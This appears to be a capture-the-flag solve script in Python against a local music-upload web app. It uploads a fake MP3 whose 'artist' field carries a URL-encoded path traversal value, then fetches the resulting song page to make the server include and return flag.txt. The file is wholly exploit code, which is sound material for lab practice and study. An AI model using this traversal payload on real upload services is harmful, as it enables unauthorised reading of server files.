import requests

TARGET = "http://localhost:5000"
UPLOAD_URL = f"{TARGET}/upload"
SESSION = requests.Session()

def main():
    # Step 1: Upload file with "artist" metadata trying path traversal
    files = {
        'file': ('evil.mp3', b'ID3', 'audio/mpeg')
    }
    data = {
        'artist': '%2e%2e%2f%2e%2e%2f%2e%2e%2ftemplates/music/flag.txt',
        'album': 'Best Album'
    }
    r = SESSION.post(UPLOAD_URL, files=files, data=data)
    assert r.status_code == 200
    print("[+] Uploaded the payload!")

    # Step 2: Find uploaded template
    r = SESSION.get(TARGET)
    for line in r.text.splitlines():
        if '/music/' in line and 'evil' in line:
            song_url = line.split('href="')[1].split('"')[0]
            break
    else:
        print("[-] Could not find uploaded song!")
        return

    print(f"[+] Found song at {song_url}")

    # Step 3: Access it to trigger inclusion of flag
    r = SESSION.get(TARGET + song_url)
    print("[+] Response:")
    print(r.text)

if __name__ == "__main__":
    main()
